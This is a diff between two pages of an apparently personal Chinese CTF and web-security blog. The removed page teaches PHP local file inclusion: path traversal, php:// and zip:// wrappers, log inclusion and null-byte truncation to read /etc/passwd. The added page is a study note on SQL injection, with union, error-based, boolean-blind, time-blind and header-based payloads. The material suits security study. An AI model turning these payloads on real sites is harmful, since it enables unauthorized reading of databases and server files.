@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="文件包含之LFI学习, hack,CTF,Security">
+    <meta name="keywords" content="SQL注入学习, hack,CTF,Security">
     <meta name="description" content="Hacking is a new sexy">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>文件包含之LFI学习 | Doublenine&#39;s Blog</title>
+    <title>SQL注入学习 | Doublenine&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -308,12 +308,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">文件包含之LFI学习</h1>
+                    <h1 class="description center-align post-title">SQL注入学习</h1>
                 </div>
             </div>
         </div>
@@ -430,10 +430,6 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
-                            </a>
-                        
                             <a href="/tags/WEB%E5%AE%89%E5%85%A8/">
                                 <span class="chip bg-color">WEB安全</span>
                             </a>
@@ -446,16 +442,16 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/WEB%E5%AE%89%E5%85%A8/" class="post-category">
-                                WEB安全
-                            </a>
-                        
-                            <a href="/categories/WEB%E5%AE%89%E5%85%A8/CTF/" class="post-category">
+                            <a href="/categories/CTF/" class="post-category">
                                 CTF
                             </a>
                         
-                            <a href="/categories/WEB%E5%AE%89%E5%85%A8/CTF/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" class="post-category">
-                                漏洞挖掘
+                            <a href="/categories/CTF/Writeup/" class="post-category">
+                                Writeup
+                            </a>
+                        
+                            <a href="/categories/CTF/Writeup/WEB%E5%AE%89%E5%85%A8/" class="post-category">
+                                WEB安全
                             </a>
                         
                     </div>
@@ -467,7 +463,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-10-26
+                    2020-05-28
                 </div>
                 
 
@@ -476,14 +472,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    672
+                    1.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    7 分
                 </div>
                 
 
@@ -498,89 +494,133 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>[TOC]</p>
-<h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><h3 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h3><p><strong>文件包含漏洞主要是由四种函数造成的</strong>：</p>
+                <h1 id="SQL注入学习"><a href="#SQL注入学习" class="headerlink" title="SQL注入学习"></a>SQL注入学习</h1><p>对sql注入的知识和技巧进行记录</p>
+<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p><strong>Sql注入攻击</strong>是通过将<strong>恶意的</strong>Sql查询或添加语句插入到对应的<strong>输入参数</strong>中，再在后台Sql服务器上解析执行执行的攻击。</p>
+<hr>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a><font color="green">整数型注入</font></h3><p>参数是int类型的，后端调用时一般没加单引号如：<br><code>select * from xxx where id=1</code></p>
 <ol>
-<li>include()</li>
-<li>require()</li>
-<li>include_once()</li>
-<li>require_once()</li>
+<li>判断数据库列数</li>
 </ol>
-<a id="more"></a>
-
+<pre><code>-1 order by x #
+// 第n个数字报错时，列数为n-1</code></pre><ol start="2">
+<li>查看数据库名;</li>
+</ol>
+<pre><code>-1 union select database(),2,3,...n-1 #</code></pre><ol start="3">
+<li>查表名</li>
+</ol>
+<pre><code>-1 union select group_concat(table_name),2,3,...n-1 from information_schema.tables where table_schema=&#39;xxx&#39; #</code></pre><ol start="4">
+<li>查字段名</li>
+</ol>
+<pre><code>-1 union select group_concat(column_name),2,3,...n-1 from information_schema.columns where table_name=&#39;xxx&#39; #</code></pre><ol start="5">
+<li>查数据</li>
+</ol>
+<pre><code>-1 union select 字段名,2,3,...n-1 from 库名.表名</code></pre><hr>
+<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a><font color="green">字符型注入</font></h3><p>参数是字符类型的，后端调用时有加上单引号<br>如：<br><code>select * from xxx where id=&#39;1&#39;</code></p>
+<p>具体步骤和数字型大致相同，不过要在参数后面加个一个单引号闭合前面的单引号</p>
+<p>比如查列数语句：</p>
+<pre><code>-1&#39; order by x #
+// 第n个数字报错时，列数为n-1</code></pre><p>其余步骤的语句都是要闭合单引号</p>
+<hr>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a><font color="green">报错注入</font></h3><p>SQL报错注入就是利用数据库的某些机制，人为的制造错误条件，使得查询结果能够出现在错误信息中。</p>
+<p><strong>1. floor()报错注入</strong><br>Payload：</p>
+<pre><code>1 Union select count(*),concat((查询语句),0x26,floor(rand(0)*2))x from information_schema.columns group by x;</code></pre><p>分析payload中的函数：</p>
+<ol>
+<li>count(): 返回匹配指定条件的行数。count(*)则返回表中的记录数</li>
+<li>floor(): 作用是向下取整，即去掉小数部分</li>
+<li>rand(): 随机取(0,1)中的一个数，但是给它一个参数就不是随机了。floor(rand(0)*2)为序列0110110</li>
+<li>concat(): 用于连接两个字符串</li>
+<li>group by x: x相同于as x,设置一个别名</li>
+<li>0x26: 16进制，转换字符为”&amp;”</li>
+</ol>
+<p><strong>爆错原因：</strong>count，rand()，group by三个连用会造成主键重复。因为floor(rand(0)*2)的重复性，导致group by语句出错</p>
+<p>查数据库名：</p>
+<pre><code>1 Union select count(*),concat((select databse()),0x26,floor(rand(0)*2))x from information_schema.columns group by x;</code></pre><p><strong>2. Xpath语法报错</strong></p>
 <ul>
-<li>用这四类函数包含文件时，文件会被当做PHP代码来执行</li>
+<li><p>extractvalue()报错注入：<br>extractvalue的作用是负责在xml文档中按照xpath语法查询节点内容<br>Payload:<br><code>1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e),1)--+</code></p>
+</li>
+<li><p>updatexml()报错注入：<br>updatexmlde的作用是负责修改查询到的内容<br>Payload:<br><code>1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</code></p>
+</li>
 </ul>
-<p><strong>include和require的区别：</strong></p>
-<ol>
-<li>include是<strong>当代码执行到它所在行</strong>才开始包含文件，如果有错，仍继续执行下去</li>
-<li>require<strong>是当程序执行</strong>就立即包含文件，有错时会停止并发出警告</li>
-</ol>
-<p><strong>文件包含漏洞类型</strong></p>
-<ol>
-<li>本地文件包含（LFI）</li>
-<li>远程文件包含（RFI）<blockquote>
-<p>当php.ini中，设置allow_url_include=On,allow_url_fopen=on.即可执行远程代码</p>
+<blockquote>
+<p>这两种报错都有长度限制，最长32位</p>
 </blockquote>
+<p><strong>3. 数据溢出报错</strong></p>
+<ol>
+<li>利用 <strong>!</strong> 溢出报错<br>mysql中BIGINT类型的最大数为18446744073709551615<br>即~0（把0按位取反）。超过这个数则溢出<br>sql中，如果一个查询成功返回，则其返回值为0。!0=1</li>
+</ol>
+<p>Payload：<br><code>1&#39; union select (!(select * from (select user())x) - ~0),2,3--+</code></p>
+<ol start="2">
+<li>exp()报错注入<br>利用double 数值类型超出范围进行报错注入</li>
+</ol>
+<pre><code>    mysql&gt; select exp(709);
+    +-----------------------+
+    | exp(709)              |
+    +-----------------------+
+    | 8.218407461554972e307 |
+    +-----------------------+
+    1 row in set (0.00 sec)
+
+    mysql&gt; select exp(710);
+    ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(710)&#39;</code></pre><p>Pyaload：<br><code>1&#39; union select (exp(~(select * FROM(SELECT USER())a))),2,3 --+</code></p>
+<p><strong>3. 利用列名重复报错</strong><br>mysql列名重复会报错。我们使用name_const来制造列<br>Payload：<br><code>1&#39; union select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x --</code></p>
+<p>利用这个特性可以用join爆列名<br>Payload：</p>
+<pre><code>mysql&gt; select *  from(select * from test a join test b)c;
+ERROR 1060 (42S21): Duplicate column name &#39;id&#39;
+mysql&gt; select *  from(select * from test a join test b using(id))c;
+ERROR 1060 (42S21): Duplicate column name &#39;name&#39;</code></pre><hr>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a><font color="green">布尔盲注</font></h3><p>盲注就是不会根据你构造的SQL注入语句返回信息，而是通过其他方式判断</p>
+<p><strong>布尔盲注</strong>：就是只会返回查询是否成功而返回True和Fales，不会返回查询到的信息。</p>
+<ol>
+<li><p>判断数据库长度：<br><code>1 and ((length(databse)))&gt;5 #</code><br>如果返回正确，则说明数据库长度大于5<br>返回错误，则说明数据库长度小于等于5</p>
+</li>
+<li><p>爆数据库名<br><code>1 and (ascii(substr(database(),1,1)))&gt;100 #</code><br>利用substr函数与ascii函数构造猜测数据库名ascii码的值的语句<br>假如数据库名第一个字母为s，则<br><code>1&#39; and (ascii(substr(database(),1,1)))=115 #</code><br>返回结果是True。以此可以继续猜测第二个第三个字母</p>
+</li>
+<li><p>爆表名<br><code>1 and (ascii(substr(select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 #</code><br>以此可以爆破此表名和其他表</p>
+</li>
+<li><p>爆列名<br><code>1 and (ascii(substr(select column_name from information_schema.columns where table_name=&quot;xxx&quot; limit 0,1),1,1))&gt;100 #</code></p>
+</li>
+<li><p>爆数据<br><code>1 and (ascii(substr(select 列名 from 数据库名.表名),1,1))=100 #</code></p>
+</li>
+</ol>
+<blockquote>
+<p>手工布尔注入很耗时间，建议用工具或者写脚本跑</p>
+</blockquote>
+<p><strong>另一种布尔注入情况</strong><br>主要是查询和一般的不一样。一般的布尔盲注是数据库查询结果为空或者查询语句报错，才回显error</p>
+<p>这种的情况是<strong>即使数据库查询为空，返回结果还是True</strong>，只有当查询语句报错才返回error</p>
+<p>这个时候，用and加上布尔盲注语句就不起作用了。因为这是根据查询结果是否为空来判断的</p>
+<p>所以这时候改用<strong>if语句</strong>来构造注入</p>
+<blockquote>
+<p>if(expr1,expr2,expr3)，如果expr1的值为true，则执行expr2语句，如果expr1的值为false，则执行expr3语句。</p>
+</blockquote>
+<p>因为mysql会对整个语句进行判断，所以让exp3为子查询语句</p>
+<p>Payload：</p>
+<pre><code>if(查询语句,1,(select table_name from information_schema.tables)) #</code></pre><p>爆数据库名：</p>
+<pre><code>if(substr(database(),1,1)=&#39;s&#39;,1,(select table_name from information_schema.tables)) #</code></pre><p>其他步骤就是把查询语句换一下就行</p>
+<hr>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a><font color="green">时间盲注</font></h3><p><strong>时间盲注</strong>指通过<font color="red">页面执行的时间</font>来判断数据内容的注入方式，通常用于数据不会回显到页面中的场景，无法利用页面回显判断数据内容，只能通过执行的时间来获取数据</p>
+<ol>
+<li>判断注入点：<br><code>1 and sleep(10)</code><br>若页面响应时间延时10秒，则存在注入</li>
+</ol>
+<p>爆数据的时候一般和if连用</p>
+<ol start="2">
+<li><p>爆数据库名：<br><code>if(substr(databse(),1,1)=&#39;x&#39;,sleep(5),1) #</code><br>若页面延时则数据库名第一个字母为x</p>
+</li>
+<li><p>爆表名：<br><code>if(substr((select table_name from information_schema.tables where table_schema=&#39;xxx&#39; limit 0,1),1,1),sleep(5),1) #</code></p>
+</li>
+<li><p>爆列名：<br><code>if(substr((select column_name from information_schema.columns where table_name=&#39;xxx&#39; limit 0,1),1,1),sleep(5),1) #</code></p>
+</li>
+<li><p>爆数据：<br><code>if(substr((select 列名 from 数据库名.表名),1,1)=&#39;x&#39;,sleep(5),1) #</code></p>
 </li>
 </ol>
 <hr>
-<h3 id="判断方法"><a href="#判断方法" class="headerlink" title="判断方法"></a>判断方法</h3><ul>
-<li><strong>从URL判断</strong><br>URL中path、dir、file、page、p、eng等等都可能存在文件包含漏洞<pre><code>http://www.example.com/?file=xxx.php</code></pre></li>
-</ul>
-<hr>
-<h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p><strong>1. 直接修改参数</strong></p>
-<pre><code>&lt;?php
-    if(isset($_GET[&#39;file&#39;])
-    {
-        include &#39;$_GET[&#39;file&#39;]&#39;;
-    }else{
-        include &#39;index.php&#39;；
-    }
-?&gt;</code></pre><p>比如网站的url为：</p>
-<pre><code>http://www.example.com/?file=index.php</code></pre><p>将<strong>index.php</strong>改为<strong>flag.php</strong></p>
-<pre><code>http://www.example.com/?file=flag.php</code></pre><p>即可输出<strong>flag.php</strong>的内容</p>
-<p>也可将<strong>?file=index.php</strong>改为<strong>../xxx.php</strong></p>
-<pre><code>http://www.example.com/?file=../xxx.php</code></pre><p>即可返回<strong>上一级目录下</strong>的xxx.php文件的内容</p>
-<ul>
-<li><strong>既然这样,我们就可以使用./(当前目录)、../(上级目录)对整个目录进行遍历,也就可以获取敏感的文件</strong></li>
-</ul>
-<hr>
-<p><strong>2. 利用PHP伪协议</strong></p>
-<ul>
-<li><strong>php://input</strong></li>
-</ul>
-<p>php://input可以读取没有处理过的==POST==数据。<strong>但当enctype=’multipart/form-data’的时候php://input是无效的。</strong></p>
-<p><img src="https://images2017.cnblogs.com/blog/1274619/201711/1274619-20171109171422763-1355830569.png" alt="image"></p>
-<ul>
-<li><strong>php://filter</strong></li>
-</ul>
-<p>用它在没有特殊情况下可以进行任意文件的读取。一般与<strong>base64编码</strong>合用，以base64编码的格式来把源代码显示出来。</p>
-<p><strong>poc: php://filter/read=convert.base64-encode/resource=xxx.php</strong></p>
-<p>南邮的ctf题目(文件包含)为例<br><a href="http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php" target="_blank" rel="noopener">nctf文件包含</a></p>
-<ul>
-<li><strong>zip协议</strong></li>
-</ul>
-<p>关于zip协议：可配合<strong>文件上传漏洞</strong>打组合拳</p>
-<p><strong>利用方法：zip://test.jpg#dir/test.php</strong></p>
-<p><font color="green">先新建一个test.php,里面写个phpinfo,然后压缩成.zip,然后把zip的名字改成test.jpg后把这个jpg文件上传上去 然后使用zip协议包含.</font></p>
-<hr>
-<p><strong>3. 包含系统的各种日志。</strong></p>
-<p>如apache日志，文件系统日志等。其中apache当记录格式为combined。再比如ngnix日志，默认路径为/var/log/ngnix/access.log</p>
-<p><a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">buuoj的一道ctf题</a></p>
-<p>……</p>
-<hr>
-<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><pre><code>&lt;?php
-    include $_GET[&#39;page&#39;].&quot;.php&quot;;
-
-?&gt;</code></pre><p>以上代码是防御LFI漏洞的其中一种方式<br>绕过方式也很简单</p>
-<p><strong>1. 00截断</strong></p>
-<p>(1) /etc/passwd%00,访问文件</p>
-<p>(2) %00目录遍历</p>
-<p><strong>2. 使用长目录截断</strong><br>/etc/passwd/././././././.[……]/./././././.<br>(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</p>
+<p><font color="green">Cookie、UA、Referer注入</font></p>
+<p>这三种注入大同小异，都是不通过url传参，而是在url请求包里用Cookie或UA或Referer来传参</p>
+<p>注入构造就是在请求包里的Cookie或UA或Referer构造语句</p>
+<p>Cookie注入：<br>在请求包里添加：<br><code>Cookie：id=-1 union select database(),2 #</code></p>
 <blockquote>
-<p>截断要考虑两个问题magic_quotes_gpc（）和PHP版本（5.3.4以下）。</p>
+<p>其余两种一样做法</p>
 </blockquote>
+<hr>
 
             </div>
             <hr/>
@@ -606,7 +646,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://gostycw.github.io/2019/10/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B9%8BLFI%E5%AD%A6%E4%B9%A0/">https://gostycw.github.io/2019/10/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B9%8BLFI%E5%AD%A6%E4%B9%A0/</a>
+                    <a href="https://gostycw.github.io/2020/05/28/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">https://gostycw.github.io/2020/05/28/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -643,10 +683,6 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
-                                </a>
                             
                                 <a href="/tags/WEB%E5%AE%89%E5%85%A8/">
                                     <span class="chip bg-color">WEB安全</span>
@@ -821,51 +857,39 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2019/10/27/PHP%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87/">
+                <a href="/2020/05/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%88%E4%B8%80%EF%BC%89/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="PHP数组绕过">
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="BUUCTF刷题记录（一）">
                         
-                        <span class="card-title">PHP数组绕过</span>
+                        <span class="card-title">BUUCTF刷题记录（一）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            PHP数组绕过绕过strops()函数1. strops()定义：
-strpos() 函数查找字符串在另一字符串中第一次出现的位置。
-
-
-
-strpos() 函数对大小写敏感。
-
-2. strops()语法：
-strpos(string,f
+                            BUUCTF刷题记录（一）WEB[hctf2018]warmup点击hint进入，得到提示flag在ffffllllaaaagggg中，并发现URL格式为XXX/index.php?file=hint.php,顺势猜一下file=sourc
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2019-10-27
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-05-28
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/PHP/" class="post-category">
-                                    PHP
-                                </a>
-                            
-                            <a href="/categories/PHP/CTF/" class="post-category">
+                            <a href="/categories/CTF/" class="post-category">
                                     CTF
                                 </a>
                             
-                            <a href="/categories/PHP/CTF/WEB%E5%AE%89%E5%85%A8/" class="post-category">
-                                    WEB安全
+                            <a href="/categories/CTF/Writeup/" class="post-category">
+                                    Writeup
                                 </a>
                             
-                            <a href="/categories/PHP/CTF/WEB%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
-                                    代码审计
+                            <a href="/categories/CTF/Writeup/WEB%E5%AE%89%E5%85%A8/" class="post-category">
+                                    WEB安全
                                 </a>
                             
                             
@@ -877,10 +901,6 @@ strpos(string,f
                     
                     <a href="/tags/CTF/">
                         <span class="chip bg-color">CTF</span>
-                    </a>
-                    
-                    <a href="/tags/WEB%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">WEB安全</span>
                     </a>
                     
                 </div>
@@ -894,41 +914,52 @@ strpos(string,f
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/10/26/Brainfuck&Ook%E5%8A%A0%E5%AF%86/">
+                <a href="/2020/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="Brainfuck&amp;Ook!加密">
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="php反序列化学习">
                         
-                        <span class="card-title">Brainfuck&amp;Ook!加密</span>
+                        <span class="card-title">php反序列化学习</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            [TOC]
-Brainfuck/Ook!编码加密
-Ook!加密语法规则OOK！只有三个不同的语法元素：Ook。OOK？OOK！
+                            PHP反序列化漏洞学习（一） 概念serialize()
+serialize() 函数用于序列化对象或数组，并返回一个字符串。
+
+serialize() 函数序列化对象后，可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。
 
 
-它们组合成两个组，各种组合组合指定命令。因此，节目必须包含偶数个“Ook”。换行符被忽略
-命令OOK。OOK
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-10-26
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-05-09
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/" class="post-category">
-                                    密码学
+                            <a href="/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-category">
+                                    反序列化
                                 </a>
                             
-                            <a href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/CTF/" class="post-category">
+                            <a href="/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CTF/" class="post-category">
                                     CTF
+                                </a>
+                            
+                            <a href="/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CTF/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                    代码审计
+                                </a>
+                            
+                            <a href="/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CTF/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" class="post-category">
+                                    漏洞挖掘
+                                </a>
+                            
+                            <a href="/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CTF/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/WEB%E5%AE%89%E5%85%A8/" class="post-category">
+                                    WEB安全
                                 </a>
                             
                             
@@ -942,8 +973,16 @@ Ook!加密语法规则OOK！只有三个不同的语法元素：Ook。OOK？OOK�
                         <span class="chip bg-color">CTF</span>
                     </a>
                     
-                    <a href="/tags/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86/">
-                        <span class="chip bg-color">加密解密</span>
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">
+                        <span class="chip bg-color">漏洞挖掘</span>
+                    </a>
+                    
+                    <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                        <span class="chip bg-color">代码审计</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                        <span class="chip bg-color">反序列化</span>
                     </a>
                     
                 </div>
